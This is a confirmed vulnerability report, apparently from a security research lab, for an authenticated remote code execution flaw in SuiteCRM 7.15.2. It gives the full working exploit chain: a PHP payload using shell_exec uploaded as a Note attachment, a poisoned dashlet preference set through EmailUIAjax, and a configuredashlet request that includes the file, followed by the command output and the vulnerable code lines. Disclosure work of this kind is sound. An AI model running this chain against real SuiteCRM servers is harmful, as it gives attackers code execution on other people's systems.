# VULN-011 — Authenticated RCE via dashlet-preference poisoning → `require_once` webshell

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: Critical
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28

## Preconditions
- One ordinary authenticated account with **Emails** + **Notes** access (both default for a RegularUser). The exploit mints a throwaway RegularUser via admin, then acts entirely as that low-priv user. No admin/role privilege is used for the attack chain.

## Request
Three requests (see `request.http`):
1. `POST /index.php` multipart — `module=Notes&action=save&name=note_<rnd>` + file field `uploadfile` = `<?php echo "\n<marker>:".shell_exec('id'); @file_put_contents('upload/rce_<rnd>.txt', shell_exec('id')); ?>` → stored at `upload/<NOTE_ID>`.
2. `POST /index.php` — `module=Emails&action=EmailUIAjax&emailUIAction=setPreference&prefName=dashlets&prefValue[pwn][fileLocation]=upload/<NOTE_ID>&prefValue[pwn][className]=stdClass`.
3. `GET /index.php?module=Emails&action=configuredashlet&id=pwn` → `require_once('upload/<NOTE_ID>')`.

## Response
See `response.txt`. The `configuredashlet` response body contains the executed payload's output:
```
RCEMARK_ba8c0cf6:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
(HTTP 500 follows only because `new stdClass($id, [])` / dashlet rendering throws *after* our code already ran — the `require_once` executes the payload first.)

## Observation
Exactly matches the static finding. The `dashlets` preference `fileLocation` is `require_once`'d with no `is_file`/extension/path/class validation (`SugarController.php:889`). `EmailUIAjax.php:1636` `setPreference` has no ACL/`is_admin` gate and stores the nested `prefValue` array verbatim under category `Emails`; `configuredashlet` reads `getPreference('dashlets', $_REQUEST['module'])` — with `module=Emails` it reads exactly what we wrote. The Note attachment is stored at `upload/<guid>` as raw bytes with no extension (`Notes/controller.php:100 final_move`), so `require_once` executes it as PHP despite the `upload/.htaccess` HTTP-403 (that only blocks HTTP access, not a filesystem include).

## Side effects
- Creates one throwaway RegularUser, one Note (+ its attachment `upload/<guid>`), and writes a proof file `upload/rce_<rnd>.txt` (containing `id` output) on the server. All under the disposable account; delete the Note/user from the admin UI to clean up. The payload only runs `id` (configurable via `CMD`); it does not modify application data.
- On-box verification (as the auditor): `docker compose -p cvehunterlab_suitecrm exec app cat /var/www/html/upload/rce_<rnd>.txt` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, confirming arbitrary command execution as the web user.

## Research & references
- OWASP WSTG-INPV-11 (Local File Inclusion) and the OWASP "PHP file inclusion → code execution" pattern — uploading a payload to a known path then including it.
- SuiteCRM RCE class lineage: GHSA-c82f-58jv-jfrh, CVE-2026-29102, CVE-2026-71550 (user-controlled include path + payload upload). The specific `configuredashlet` `fileLocation` sink appears novel (Stage-07 found no exact advisory).

## If FAILED
n/a — CONFIRMED.

## If NEEDS_MANUAL
n/a.
